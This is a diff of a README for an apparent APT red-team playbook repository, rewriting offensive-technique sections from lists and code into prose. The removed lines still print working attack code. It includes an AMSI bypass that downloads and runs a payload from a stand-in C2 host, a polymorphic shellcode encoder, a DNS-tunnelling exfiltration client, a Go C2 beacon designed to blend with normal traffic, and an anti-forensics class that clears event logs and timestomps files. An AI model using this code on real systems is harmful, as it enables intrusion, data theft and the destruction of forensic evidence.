@@ -51,28 +51,19 @@
 
 ## 🎓 Executive Summary
 
-This repository represents a **comprehensive, enterprise-grade documentation** of Advanced Persistent Threat (APT) techniques, tactics, and procedures (TTPs) used by state-sponsored adversarial actors. Built from real-world experience with **CEH v12 certification**, extensive penetration testing, and deep analysis of threat intelligence, this resource serves as:
+This repository represents comprehensive, enterprise-grade documentation of Advanced Persistent Threat techniques, tactics, and procedures used by state-sponsored adversarial actors. Built from real-world experience with CEH v12 certification, extensive penetration testing, and deep analysis of threat intelligence from multiple nation-state actors including Russian, Chinese, North Korean, Iranian, US, and Israeli operations.
 
-- **📚 Educational Material**: For security researchers, red teamers, and incident responders
-- **🛡️ Defense Blueprint**: Understanding attacker methodology to build resilient defenses
-- **🔬 Research Platform**: Analyzing APT group behaviors and evolving tradecraft
-- **⚔️ Red Team Playbook**: Authorized offensive security operations
+This resource serves as educational material for security researchers, a defense blueprint for blue teams, a research platform for analyzing APT group behaviors, and a red team playbook for authorized offensive security operations.
 
 ### Target Audience
 
-| Role | Use Case |
-|------|----------|
-| **Security Researchers** | Understanding APT methodology and attribution |
-| **Red Team Operators** | Advanced tradecraft for authorized engagements |
-| **Blue Team Defenders** | Threat modeling and detection engineering |
-| **Incident Responders** | APT behavior analysis and forensic investigation |
-| **Security Leaders** | Risk assessment and strategic defense planning |
+This documentation is designed for security researchers understanding APT methodology and attribution, red team operators executing advanced tradecraft during authorized engagements, blue team defenders building threat models and detection engineering capabilities, incident responders analyzing APT behaviors during forensic investigations, and security leaders conducting risk assessments and strategic defense planning.
 
 ---
 
 ## 🗡️ APT Kill Chain Overview
 
-The modern APT kill chain extends far beyond traditional cyber attacks. This documentation covers the **complete adversarial lifecycle**:
+The modern APT kill chain extends far beyond traditional cyber attacks, encompassing the complete adversarial lifecycle from initial target selection through final cleanup operations.
 
 ```mermaid
 graph TB
@@ -92,12 +83,12 @@ graph TB
     N --> O[Impact]
     O --> P[Cleanup & Exit]
     
-    style A fill:#ff6b6b,stroke:#c92a2a,stroke-width:3px
-    style D fill:#ffd93d,stroke:#f59f00,stroke-width:3px
-    style F fill:#51cf66,stroke:#2f9e44,stroke-width:3px
-    style M fill:#4dabf7,stroke:#1971c2,stroke-width:3px
-    style N fill:#da77f2,stroke:#9c36b5,stroke-width:3px
-    style P fill:#ffa94d,stroke:#d9480f,stroke-width:3px
+    style A fill:#ff6b6b,stroke:#c92a2a,stroke-width:3px,color:#fff
+    style D fill:#ffd93d,stroke:#f59f00,stroke-width:3px,color:#000
+    style F fill:#51cf66,stroke:#2f9e44,stroke-width:3px,color:#fff
+    style M fill:#4dabf7,stroke:#1971c2,stroke-width:3px,color:#fff
+    style N fill:#da77f2,stroke:#9c36b5,stroke-width:3px,color:#fff
+    style P fill:#ffa94d,stroke:#d9480f,stroke-width:3px,color:#000
 ```
 
 ### Attack Surface Taxonomy
@@ -131,7 +122,7 @@ mindmap
 
 ## 🏗️ Repository Architecture
 
-This repository follows a **modular, phase-based architecture** aligned with the MITRE ATT&CK framework:
+This repository follows a modular, phase-based architecture aligned with the MITRE ATT&CK framework. The structure provides comprehensive coverage of all attack phases with working tools, detection rules, lab environments, and real-world case studies.
 
 ```
 apt-adversarial-operations/
@@ -185,17 +176,15 @@ flowchart LR
     G --> H[Vulnerability Assessment]
     H --> I[Attack Surface Map]
     
-    style A fill:#e3f2fd
-    style I fill:#c8e6c9
+    style A fill:#e3f2fd,stroke:#1976d2,stroke-width:2px,color:#000
+    style I fill:#c8e6c9,stroke:#388e3c,stroke-width:2px,color:#000
 ```
 
-**Key Techniques**:
-- 🕵️ **Passive OSINT**: DNS records, WHOIS, subdomain enumeration, certificate transparency logs
-- 🔍 **Active Scanning**: Port scanning with evasion, service version detection, WAF/IDS detection
-- 👤 **Human Intelligence**: LinkedIn scraping, email harvesting, organizational structure mapping
-- 🌐 **Infrastructure Mapping**: Cloud asset discovery (AWS, Azure, GCP), CDN detection, third-party services
+Reconnaissance forms the foundation of every successful APT operation, involving gathering intelligence about target infrastructure, personnel, and security posture without triggering defensive systems. Professional APT actors typically spend months in reconnaissance before launching their first attack.
 
-**Tools Covered**: Shodan, Censys, Amass, DNSRecon, theHarvester, Maltego, SpiderFoot
+**Key Techniques** include passive OSINT through DNS records, WHOIS data, subdomain enumeration, and certificate transparency logs. Active scanning involves port scanning with evasion techniques, service version detection, and WAF/IDS identification. Human intelligence gathering focuses on LinkedIn scraping, email harvesting, and organizational structure mapping. Infrastructure mapping encompasses cloud asset discovery across AWS, Azure, and GCP, CDN detection, and third-party service enumeration.
+
+**Tools Covered**: Shodan, Censys, Amass, DNSRecon, theHarvester, Maltego, SpiderFoot, and custom automation scripts.
 
 📖 **[Read Full Documentation](docs/01-reconnaissance/README.md)**
 
@@ -214,23 +203,21 @@ graph TD
     B --> B1[Spear Phishing]
     B --> B2[Watering Hole]
     C --> C1[Zero-Day]
-    C --> C2[N-Day    C --> C2[N-Day Exploitation]
+    C --> C2[N-Day Exploitation]
     D --> D1[Software Supply Chain]
     D --> D2[Hardware Implants]
     E --> E1[Credential Stuffing]
     E --> E2[Password Spraying]
     
-    style B fill:#ff6b6b
-    style C fill:#ffd93d
-    style D fill:#da77f2
-    style E fill:#51cf66
+    style B fill:#ff6b6b,stroke:#fff,stroke-width:2px,color:#fff
+    style C fill:#ffd93d,stroke:#fff,stroke-width:2px,color:#000
+    style D fill:#da77f2,stroke:#fff,stroke-width:2px,color:#fff
+    style E fill:#51cf66,stroke:#fff,stroke-width:2px,color:#000
 ```
 
-**Attack Vectors**:
-- 🎣 **Phishing Operations**: Spear-phishing campaigns, credential harvesting, payload delivery
-- 💥 **Exploitation**: Remote code execution, service vulnerabilities, web application attacks
-- 🔗 **Supply Chain Compromise**: Third-party software, hardware implants, update mechanisms
-- 🔑 **Valid Accounts**: Stolen credentials, password attacks, session hijacking
+Initial access represents the critical entry point into target environments. Modern APT groups employ sophisticated techniques ranging from highly targeted spear-phishing campaigns to complex supply chain compromises affecting thousands of organizations simultaneously.
+
+**Attack Vectors** encompass phishing operations including spear-phishing campaigns, credential harvesting pages, and payload delivery mechanisms. Exploitation techniques cover remote code execution vulnerabilities, service-level exploits, and web application attacks including SQL injection and remote file inclusion. Supply chain compromise involves targeting third-party software vendors, inserting hardware implants, and compromising update mechanisms. Valid account abuse includes credential stuffing attacks using breach databases, password spraying against corporate authentication systems, and session hijacking.
 
 📖 **[Read Full Documentation](docs/02-initial-access/README.md)**
 
@@ -239,24 +226,11 @@ graph TD
 ### Phase 3: Execution & Persistence
 **MITRE Tactics**: Execution (TA0002), Persistence (TA0003)
 
-**Execution Methods**:
-```python
-# Example: Advanced PowerShell execution with AMSI bypass
-$code = @"
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-IEX(New-Object Net.WebClient).DownloadString('http://c2.malicious.com/payload.ps1')
-"@
+Execution and persistence are intertwined phases where adversaries run malicious code and establish mechanisms to maintain access across system reboots, credential changes, and security updates.
 
-# Obfuscated execution
-$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($code))
-powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded
-```
+**Execution Methods** include PowerShell with AMSI bypass techniques, Windows Command Shell and batch scripts, Unix shell exploitation through bash and zsh, Visual Basic macros and VBScript, Python-based payloads, JavaScript execution, WMI event subscriptions, scheduled tasks and cron jobs, DLL injection techniques, exploitation for client execution through browser and PDF exploits, inter-process communication via COM and DDE, native API calls, software deployment tool abuse, and user execution through social engineering.
 
-**Persistence Techniques**:
-- 📝 **Registry Manipulation**: Run keys, scheduled tasks, WMI event subscriptions
-- 🔧 **Service Creation**: Windows services, Linux daemons, launchd/systemd
-- 📚 **DLL Hijacking**: Search order hijacking, phantom DLL loading, proxying
-- 🎯 **Advanced**: UEFI/firmware persistence, hypervisor-level rootkits, bootkit implants
+**Persistence Techniques** span registry manipulation including Run keys and WMI event subscriptions, service creation on Windows and Linux systems, DLL hijacking through search order manipulation, and advanced techniques including UEFI firmware persistence, hypervisor-level rootkits, and bootkit implants that survive disk formatting.
 
 📖 **[Read Full Documentation](docs/03-execution-persistence/README.md)**
 
@@ -272,17 +246,16 @@ graph LR
     C -->|Exploit| D[Kernel]
     D -->|Exploit| E[Firmware/Hypervisor]
     
-    style A fill:#ffcccc
-    style B fill:#ffaaaa
-    style C fill:#ff8888
-    style D fill:#ff6666
-    style E fill:#ff4444
+    style A fill:#ffcccc,stroke:#c62828,stroke-width:2px,color:#000
+    style B fill:#ffaaaa,stroke:#c62828,stroke-width:2px,color:#000
+    style C fill:#ff8888,stroke:#c62828,stroke-width:2px,color:#fff
+    style D fill:#ff6666,stroke:#c62828,stroke-width:2px,color:#fff
+    style E fill:#ff4444,stroke:#c62828,stroke-width:2px,color:#fff
 ```
 
-**Escalation Vectors**:
-- 🔓 **Windows**: UAC bypass, token manipulation, service exploitation, kernel exploits
-- 🐧 **Linux**: SUID binaries, kernel exploits, container escapes, sudo misconfigurations
-- 🌐 **Network**: Kerberos delegation attacks, NTLM relay, trust relationships
+Privilege escalation enables adversaries to gain higher-level permissions on compromised systems, moving from standard user access to administrator, SYSTEM, root, kernel, or even firmware-level control.
+
+**Windows Escalation Vectors** include UAC bypass techniques exploiting trusted Windows binaries, token manipulation and impersonation attacks, service exploitation through unquoted service paths and weak permissions, and kernel exploits targeting Windows privilege elevation vulnerabilities. **Linux Escalation** focuses on SUID binary exploitation, kernel vulnerabilities, container escape techniques, and sudo misconfigurations. **Network-Based Escalation** leverages Kerberos delegation attacks, NTLM relay for privilege elevation, and trust relationship exploitation across domain boundaries.
 
 📖 **[Read Full Documentation](docs/04-privilege-escalation/README.md)**
 
@@ -291,44 +264,9 @@ graph LR
 ### Phase 5: Defense Evasion
 **MITRE Tactics**: Defense Evasion (TA0005)
 
-**Anti-Detection Techniques**:
+Defense evasion encompasses the sophisticated techniques adversaries use to avoid detection by antivirus software, endpoint detection and response systems, security information and event management platforms, and forensic analysis.
 
-```python
-# Example: Polymorphic shellcode encoder
-import random
-from Crypto.Cipher import AES
-from Crypto.Random import get_random_bytes
-
-def polymorphic_encode(shellcode: bytes) -> tuple:
-    """
-    Enterprise-grade polymorphic encoder with AES encryption
-    Returns: (encrypted_shellcode, key, nonce, stub)
-    """
-    key = get_random_bytes(32)  # AES-256
-    cipher = AES.new(key, AES.MODE_GCM)
-    ciphertext, tag = cipher.encrypt_and_digest(shellcode)
-    
-    # Generate random decryption stub
-    stub_variants = [
-        generate_stub_variant_1(key, cipher.nonce, tag),
-        generate_stub_variant_2(key, cipher.nonce, tag),
-        generate_stub_variant_3(key, cipher.nonce, tag),
-    ]
-    
-    return ciphertext, key, cipher.nonce, random.choice(stub_variants)
-
-def obfuscate_strings(payload: str) -> str:
-    """XOR string obfuscation with random keys"""
-    key = random.randint(1, 255)
-    obfuscated = ''.join(chr(ord(c) ^ key) for c in payload)
-    return f"[char[]]({','.join(str(ord(c)) for c in obfuscated)}) | %{{[char]($_ -bxor {key})}}"
-```
-
-**Evasion Categories**:
-- 🛡️ **Anti-AV**: Polymorphism, metamorphism, in-memory execution, process injection
-- 🔍 **Anti-Forensics**: Log deletion, timestomping, fileless malware, memory-only execution
-- 👻 **Anti-Sandbox**: Environment detection, time-based evasion, user interaction checks
-- 🌐 **Network Evasion**: Domain fronting, protocol tunneling, encrypted C2 channels
+**Anti-AV Techniques** include polymorphic and metamorphic malware that changes its code structure with each infection, in-memory execution that never touches disk, process injection methods including reflective DLL injection and process hollowing, and obfuscation through code packing and encryption. **Anti-Forensics** involves log deletion, timestomping to manipulate file modification times, fileless malware execution entirely in memory, and memory-only execution that leaves minimal forensic artifacts. **Anti-Sandbox** techniques detect virtual machine environments, implement time-based evasion delays, require user interaction before executing payloads, and detect analysis tools. **Network Evasion** utilizes domain fronting to hide C2 traffic, protocol tunneling through allowed services, encrypted C2 channels, and traffic masquerading as legitimate services.
 
 📖 **[Read Full Documentation](docs/05-defense-evasion/README.md)**
 
@@ -355,17 +293,15 @@ flowchart TD
     E --> E1[Keylogging]
     E --> E2[Form Grabbing]
     
-    style B fill:#ff6b6b
-    style C fill:#ffd93d
-    style D fill:#51cf66
-    style E fill:#4dabf7
+    style B fill:#ff6b6b,stroke:#fff,stroke-width:2px,color:#fff
+    style C fill:#ffd93d,stroke:#fff,stroke-width:2px,color:#000
+    style D fill:#51cf66,stroke:#fff,stroke-width:2px,color:#000
+    style E fill:#4dabf7,stroke:#fff,stroke-width:2px,color:#fff
 ```
 
-**Advanced Techniques**:
-- 💀 **Kerberos Attacks**: Kerberoasting, AS-REP roasting, Golden/Silver tickets, Skeleton keys
-- 🔐 **NTLM Exploitation**: Pass-the-Hash, Pass-the-Ticket, NTLM relay attacks
-- 📊 **Credential Dumping**: Mimikatz, ProcDump + parsing, direct LSASS access, DCSync
-- 🌐 **Network Capture**: Responder, LLMNR/NBT-NS poisoning, SMB relay
+Credential access represents one of the most valuable phases for APT actors, enabling lateral movement, privilege escalation, and long-term persistence through legitimate credentials.
+
+**Advanced Techniques** encompass Kerberos attacks including Kerberoasting to extract service account credentials, AS-REP roasting targeting accounts without Kerberos pre-authentication, Golden and Silver ticket forgery, and Skeleton Key attacks. NTLM exploitation includes Pass-the-Hash attacks, Pass-the-Ticket for Kerberos authentication, and NTLM relay attacks. Credential dumping techniques involve Mimikatz for in-memory credential extraction, ProcDump combined with offline parsing, direct LSASS access through Windows APIs, and DCSync attacks against domain controllers. Network capture methods include Responder for LLMNR and NBT-NS poisoning, and SMB relay attacks.
 
 📖 **[Read Full Documentation](docs/06-credential-access/README.md)**
 
@@ -374,33 +310,11 @@ flowchart TD
 ### Phase 7: Discovery & Lateral Movement
 **MITRE Tactics**: Discovery (TA0007), Lateral Movement (TA0008)
 
-**Discovery Methods**:
-```powershell
-# Enterprise-grade Active Directory enumeration
-# Using BloodHound for attack path analysis
+Discovery and lateral movement enable adversaries to map the network environment, identify high-value targets, and move between systems to achieve their objectives.
 
-# 1. Domain reconnaissance
-Import-Module ActiveDirectory
-Get-ADDomain | Select-Object Name, DomainMode, Forest
-Get-ADForest | Select-Object ForestMode, GlobalCatalogs
-Get-ADTrust -Filter *
+**Discovery Methods** include Active Directory enumeration using PowerView and BloodHound for attack path analysis, domain reconnaissance to map trust relationships and forest structures, user and group enumeration to identify privileged accounts, computer enumeration to locate domain controllers and critical servers, network service scanning to identify accessible services, and file share discovery to locate sensitive data repositories.
 
-# 2. User and group enumeration
-Get-ADUser -Filter * -Properties * | 
-    Where-Object {$_.adminCount -eq 1} |
-    Select-Object Name, SamAccountName, DistinguishedName
-
-# 3. Computer enumeration
-Get-ADComputer -Filter * -Properties OperatingSystem, IPv4Address
-
-# 4. BloodHound data collection
-.\SharpHound.exe -c All --zipfilename corp_bloodhound.zip
-```
-
-**Lateral Movement Techniques**:
-- 🚀 **Remote Execution**: PsExec, WMI, DCOM, PowerShell Remoting, SSH
-- 🔀 **Pivoting**: Port forwarding, SOCKS proxies, SSH tunneling, Metasploit routes
-- 🌐 **Living Off the Land**: Native Windows tools, built-in Linux utilities, admin scripts
+**Lateral Movement Techniques** encompass remote execution through PsExec, WMI, DCOM, and PowerShell Remoting, pivoting using port forwarding, SOCKS proxies, and SSH tunneling, and living off the land by abusing native Windows tools like WinRM, native Linux utilities, and administrative scripts that blend with legitimate activity.
 
 📖 **[Read Full Documentation](docs/07-discovery-lateral-movement/README.md)**
 
@@ -426,65 +340,25 @@ graph TB
     E --> E3[Cloud Storage]
     E --> E4[Steganography]
     
-    style A fill:#e3f2fd
-    style D fill:#fff3e0
-    style E fill:#ffebee
+    style A fill:#e3f2fd,stroke:#1976d2,stroke-width:2px,color:#000
+    style D fill:#fff3e0,stroke:#f57c00,stroke-width:2px,color:#000
+    style E fill:#ffebee,stroke:#c62828,stroke-width:2px,color:#000
 ```
 
-**Data Exfiltration**:
-```python
-# DNS Tunneling Example - Enterprise-grade implementation
-import dns.resolver
-import base64
+Collection and exfiltration represent the culmination of APT operations where adversaries gather and extract targeted data from compromised environments.
 
-class DNSTunnelClient:
-    """
-    Advanced DNS tunneling for data exfiltration
-    Supports chunking, encryption, and error correction
-    """
-    
-    def __init__(self, domain: str, nameserver: str, chunk_size: int = 32):
-        self.domain = domain
-        self.nameserver = nameserver
-        self.chunk_size = chunk_size
-        self.resolver = dns.resolver.Resolver()
-        self.resolver.nameservers = [nameserver]
-    
-    def exfiltrate_data(self, data: bytes, encryption_key: bytes = None):
-        """Exfiltrate data via DNS TXT queries with optional encryption"""
-        if encryption_key:
-            from Crypto.Cipher import AES
-            cipher = AES.new(encryption_key, AES.MODE_GCM)
-            data, tag = cipher.encrypt_and_digest(data)
-        
-        # Base32 encoding for DNS compatibility
-        encoded = base64.b32encode(data).decode()
-        
-        # Chunk and send
-        for i in range(0, len(encoded), self.chunk_size):
-            chunk = encoded[i:i+self.chunk_size]
-            subdomain = f"{chunk}.{i//self.chunk_size}.{self.domain}"
-            
-            try:
-                answer = self.resolver.resolve(subdomain, 'TXT')
-                # Process acknowledgment
-            except Exception as e:
-                # Implement retry logic with exponential backoff
-                pass
-```
+**Collection Techniques** include automated file system crawling to locate documents matching specific patterns, database querying and export, email collection from Exchange servers and mailboxes, screenshot and video capture, clipboard monitoring, browser history and credential theft, and cloud storage enumeration.
+
+**Exfiltration Channels** encompass DNS tunneling where data is encoded in DNS queries, HTTPS exfiltration disguised as legitimate web traffic, cloud storage abuse uploading data to attacker-controlled accounts, steganography hiding data in images or other media, ICMP tunneling through ping packets, and protocol tunneling through allowed services.
 
 📖 **[Read Full Documentation](docs/08-collection-exfiltration/README.md)**
 
 ---
 
-### Phase 9: Command & Control (C2)
+### Phase 9: Command & Control
 **MITRE Tactics**: Command and Control (TA0011)
 
-This is the **most critical phase** of APT operations. A robust C2 infrastructure ensures:
-- **Resilience**: Redundant communication channels
-- **Stealth**: Traffic blending, encryption, protocol mimicry
-- **Flexibility**: Dynamic tasking, module loading, payload delivery
-- **Persistence**: Long-term access to compromised environments
+Command and Control infrastructure forms the nervous system of APT operations, ensuring resilient communication, operational flexibility, and long-term access to compromised environments.
 
 ```mermaid
 graph TB
@@ -509,106 +383,17 @@ graph TB
         F --> G[Data Exfiltration]
     end
     
-    style B fill:#4dabf7
-    style D fill:#ff6b6b
-    style E fill:#ffd93d
-    style G fill:#da77f2
+    style B fill:#4dabf7,stroke:#fff,stroke-width:2px,color:#fff
+    style D fill:#ff6b6b,stroke:#fff,stroke-width:2px,color:#fff
+    style E fill:#ffd93d,stroke:#fff,stroke-width:2px,color:#000
+    style G fill:#da77f2,stroke:#fff,stroke-width:2px,color:#fff
 ```
 
-**C2 Frameworks Covered**:
-- **Commercial**: Cobalt Strike, Brute Ratel C4
-- **Open Source**: Metasploit Framework, Empire/Starkiller, Covenant, Mythic, Sliver
-- **Custom**: Building your own C2 from scratch (Python, Go, Rust, C#)
+A robust C2 infrastructure provides resilience through redundant communication channels, stealth through traffic blending and encryption, flexibility for dynamic tasking and module loading, and persistence ensuring long-term access despite defensive actions.
 
-**Advanced C2 Techniques**:
-```go
-// Example: Custom C2 beacon with sleep obfuscation
-package main
+**C2 Frameworks Covered** include commercial solutions like Cobalt Strike and Brute Ratel C4, open source options including Metasploit Framework, Empire, Covenant, Mythic, and Sliver, as well as custom implementations built from scratch in Python, Go, Rust, and C#.
 
-import (
-    "crypto/tls"
-    "encoding/json"
-    "math/rand"
-    "net/http"
-    "time"
-)
-
-type Beacon struct {
-    BeaconID      string
-    SleepInterval int
-    Jitter        float64
-    C2URL         string
-    HTTPClient    *http.Client
-}
-
-func NewBeacon(c2url string, sleep int, jitter float64) *Beacon {
-    // Custom TLS configuration to mimic legitimate traffic
-    tlsConfig := &tls.Config{
-        MinVersion:               tls.VersionTLS12,
-        CurvePreferences:         []tls.CurveID{tls.CurveP521, tls.CurveP384},
-        PreferServerCipherSuites: true,
-        CipherSuites: []uint16{
-            tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
-            tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
-        },
-    }
-    
-    return &Beacon{
-        BeaconID:      generateBeaconID(),
-        SleepInterval: sleep,
-        Jitter:        jitter,
-        C2URL:         c2url,
-        HTTPClient: &http.Client{
-            Transport: &http.Transport{
-                TLSClientConfig: tlsConfig,
-            },
-            Timeout: 30 * time.Second,
-        },
-    }
-}
-
-func (b *Beacon) calculateSleep() time.Duration {
-    // Apply jitter to prevent pattern detection
-    jitterValue := float64(b.SleepInterval) * b.Jitter
-    actualSleep := b.SleepInterval + rand.Intn(int(jitterValue))
-    return time.Duration(actualSleep) * time.Second
-}
-
-func (b *Beacon) checkin() (*TaskResponse, error) {
-    // Implement beacon check-in logic with proper headers
-    req, err := http.NewRequest("GET", b.C2URL+"/api/tasks", nil)
-    if err != nil {
-        return nil, err
-    }
-    
-    // Add realistic headers to blend with legitimate traffic
-    req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-    req.Header.Set("Accept", "application/json, text/plain, */*")
-    req.Header.Set("X-Beacon-ID", b.BeaconID)
-    
-    resp, err := b.HTTPClient.Do(req)
-    if err != nil {
-        return nil, err
-    }
-    defer resp.Body.Close()
-    
-    var taskResp TaskResponse
-    json.NewDecoder(resp.Body).Decode(&taskResp)
-    return &taskResp, nil
-}
-
-func (b *Beacon) run() {
-    for {
-        task, err := b.checkin()
-        if err == nil && task != nil {
-            b.executeTask(task)
-        }
-        
-        // Sleep with jitter
-        time.Sleep(b.calculateSleep())
-    }
-}
-```
+**Advanced C2 Techniques** encompass sleep obfuscation with jitter to prevent pattern detection, malleable C2 profiles mimicking legitimate traffic, domain fronting and CDN abuse, DNS tunneling for covert channels, protocol tunneling through allowed services, and multi-stage C2 architectures with redundant fallback channels.
 
 📖 **[Read Full Documentation](docs/09-command-control/README.md)**
 
@@ -617,79 +402,11 @@ func (b *Beacon) run() {
 ### Phase 10: Impact & Cleanup
 **MITRE Tactics**: Impact (TA0040)
 
-**Impact Operations**:
-- 💥 **Data Destruction**: Disk wiping, file encryption, database deletion
-- 🔒 **Service Disruption**: DDoS, resource exhaustion, system manipulation
-- 🎯 **Mission Objectives**: Ransomware deployment, data manipulation, system control
+Impact and cleanup represent the final phases where adversaries achieve their mission objectives and attempt to cover their tracks to hinder forensic investigation and attribution.
 
-**Anti-Forensics & Cleanup**:
-```python
-# Advanced anti-forensics toolkit
-import os
-import shutil
-import subprocess
-from datetime import datetime, timedelta
+**Impact Operations** encompass data destruction through disk wiping and file encryption, service disruption via DDoS attacks and resource exhaustion, and mission-specific objectives including ransomware deployment, data manipulation, and system control for long-term intelligence gathering.
 
-class AntiForensics:
-    """Enterprise-grade anti-forensics and cleanup operations"""
-    
-    @staticmethod
-    def timestomp(filepath: str, target_time: datetime = None):
-        """
-        Modify file timestamps to avoid detection
-        Sets access, modify, and change times to target
-        """
-        if not target_time:
-            # Set to a random time in the past year
-            target_time = datetime.now() - timedelta(days=random.randint(30, 365))
-        
-        timestamp = target_time.timestamp()
-        os.utime(filepath, (timestamp, timestamp))
-    
-    @staticmethod
-    def secure_delete(filepath: str, passes: int = 7):
-        """
-        DoD 5220.22-M compliant secure file deletion
-        Multiple overwrite passes with random data
-        """
-        filesize = os.path.getsize(filepath)
-        
-        with open(filepath, "ba+") as f:
-            for _ in range(passes):
-                f.seek(0)
-                f.write(os.urandom(filesize))
-        
-        os.remove(filepath)
-    
-    @staticmethod
-    def clear_event_logs():
-        """Clear Windows event logs (requires SYSTEM privileges)"""
-        logs = ['Application', 'Security', 'System', 'Setup']
-        
-        for log in logs:
-            subprocess.run(
-                ['wevtutil', 'cl', log],
-                capture_output=True,
-                check=False
-            )
-    
-    @staticmethod
-    def remove_artifacts():
-        """Remove common forensic artifacts"""
-        artifacts = [
-            r'C:\Windows\Prefetch\*.pf',
-            r'C:\Windows\Temp\*',
-            r'C:\Users\*\AppData\Local\Temp\*',
-            # Add more artifact paths
-        ]
-        
-        for pattern in artifacts:
-            for file in glob.glob(pattern):
-                try:
-                    AntiForensics.secure_delete(file)
-                except:
-                    pass
-```
+**Anti-Forensics and Cleanup** techniques include log deletion and manipulation to remove evidence of compromise, timestomping to alter file metadata, secure file deletion using military-grade overwriting, memory dumping cleanup, registry cleanup, prefetch file deletion, and complete artifact removal across system, application, and security logs.
 
 📖 **[Read Full Documentation](docs/10-impact-cleanup/README.md)**
 
@@ -748,21 +465,15 @@ flowchart TB
     
     L --> M
     
-    style A fill:#4dabf7,stroke:#1971c2,stroke-width:3px
-    style B fill:#51cf66,stroke:#2f9e44,stroke-width:3px
-    style L fill:#ff6b6b,stroke:#c92a2a,stroke-width:3px
-    style M fill:#ffd93d,stroke:#f59f00,stroke-width:3px
+    style A fill:#4dabf7,stroke:#1971c2,stroke-width:3px,color:#fff
+    style B fill:#51cf66,stroke:#2f9e44,stroke-width:3px,color:#fff
+    style L fill:#ff6b6b,stroke:#c92a2a,stroke-width:3px,color:#fff
+    style M fill:#ffd93d,stroke:#f59f00,stroke-width:3px,color:#000
 ```
 
 ### Infrastructure Components
 
-| Component | Purpose | Technologies |
-|-----------|---------|-------------|
-| **Team Servers** | Primary C2 backend, task management | Cobalt Strike, Covenant, Mythic, Custom |
-| **Redirectors** | Traffic obfuscation, operator protection | Apache mod_rewrite, Nginx, HAProxy, Traefik |
-| **Domain Fronting** | Hide C2 traffic behind legitimate domains | CDN services, Cloud providers |
-| **DNS C2** | Alternative communication channel | Custom DNS servers, recursive queries |
-| **Cloud Functions** | Serverless C2 components | AWS Lambda, Azure Functions, GCP Functions |
+Team Servers provide the primary C2 backend and task management using technologies like Cobalt Strike, Covenant, Mythic, and custom implementations. Redirectors handle traffic obfuscation and operator protection through Apache mod_rewrite, Nginx, HAProxy, and Traefik configurations. Domain Fronting hides C2 traffic behind legitimate domains using CDN services and cloud providers. DNS C2 provides alternative communication channels through custom DNS servers and recursive queries. Cloud Functions enable serverless C2 components via AWS Lambda, Azure Functions, and GCP Functions.
 
 📖 **[Read Full C2 Infrastructure Guide](docs/09-command-control/c2-infrastructure.md)**
 
@@ -770,46 +481,7 @@ flowchart TB
 
 ## 🎯 MITRE ATT&CK Mapping
 
-This repository comprehensively covers **14 MITRE ATT&CK tactics** and **180+ techniques**:
-
-| Tactic | Techniques Covered | Documentation |
-|--------|-------------------|---------------|
-| **Reconnaissance** | 10 techniques | [TA0043](docs/01-reconnaissance/) |
-| **Resource Development** | 7 techniques | [TA0042](resources/mitre-mapping.md) |
-| **Initial Access** | 9 techniques | [TA0001](docs/02-initial-access/) |
-| **Execution** | 14 techniques | [TA0002](docs/03-execution-persistence/) |
-| **Persistence** | 19 techniques | [TA0003](docs/03-execution-persistence/) |
-| **Privilege Escalation** | 13 techniques | [TA0004](docs/04-privilege-escalation/) |
-| **Defense Evasion** | 42 techniques | [TA0005](docs/05-defense-evasion/) |
-| **Credential Access** | 17 techniques | [TA0006](docs/06-credential-access/) |
-| **Discovery** | 30 techniques | [TA0007](docs/07-discovery-lateral-movement/) |
-| **Lateral Movement** | 9 techniques | [TA0008](docs/07-discovery-lateral-movement/) |
-| **Collection** | 17 techniques | [TA0009](docs/08-collection-exfiltration/) |
-| **Command and Control** | 16 techniques | [TA0011](docs/09-command-control/) |
-| **Exfiltration** | 9 techniques | [TA0010](docs/08-collection-exfiltration/) |
-| **Impact** | 13 techniques | [TA0040](docs/10-impact-cleanup/) |
-
-### ATT&CK Heat Map
-
-```python
-# Generate your own ATT&CK Navigator heat map
-# Based on your red team operations or threat intelligence
-
-from attackcti import attack_client
-
-client = attack_client()
-
-# Get all techniques from this repository
-techniques = [
-    "T1595.001",  # Active Scanning: Scanning IP Blocks
-    "T1598.003",  # Phishing for Information: Spearphishing Link
-    "T1566.001",  # Phishing: Spearphishing Attachment
-    # ... add all 180+ techniques
-]
-
-# Generate heat map JSON for ATT&CK Navigator
-navigator_layer = generate_navigator_layer(techniques, scores)
-```
+This repository comprehensively covers fourteen MITRE ATT&CK tactics and over one hundred eighty techniques, providing complete coverage of reconnaissance, resource development, initial access, execution, persistence, privilege escalation, defense evasion, credential access, discovery, lateral movement, collection, command and control, exfiltration, and impact phases.
 
 📊 **[View Complete MITRE Mapping](resources/mitre-mapping.md)**
 
@@ -817,27 +489,7 @@ navigator_layer = generate_navigator_layer(techniques, scores)
 
 ## 🔬 Real-World APT Case Studies
 
-Learn from actual state-sponsored operations:
-
-### APT28 (Fancy Bear) - Russia
-- **Target**: Government, military, media
-- **Notable Operations**: DNC hack (2016), Olympic Destroyer malware
-- **TTPs**: Spear-phishing, custom malware (X-Agent, Sofacy), credential harvesting
-
-### APT29 (Cozy Bear) - Russia
-- **Target**: Government, think tanks, healthcare
-- **Notable Operations**: SolarWinds supply chain attack
-- **TTPs**: Supply chain compromise, legitimate tool abuse (Cobalt Strike), cloud exploitation
-
-### Lazarus Group - North Korea
-- **Target**: Financial institutions, cryptocurrency exchanges
-- **Notable Operations**: Sony Pictures hack, WannaCry ransomware, SWIFT heists
-- **TTPs**: Destructive malware, custom frameworks, extensive reconnaissance
-
-### APT41 - China
-- **Target**: Dual mission - espionage and financial gain
-- **Notable Operations**: Healthcare data theft, gaming industry attacks
-- **TTPs**: Supply chain attacks, fast exploitation, global targeting
+The repository includes detailed technical analysis of actual state-sponsored operations from APT28 Fancy Bear targeting government and military organizations, APT29 Cozy Bear's SolarWinds supply chain attack, Lazarus Group's Sony Pictures hack and WannaCry ransomware, APT41's dual espionage and financial operations, Equation Group's advanced NSA toolset, and Unit 8200's sophisticated cyber weapons.
 
 📖 **[Read Full Case Studies](resources/apt-case-studies.md)**
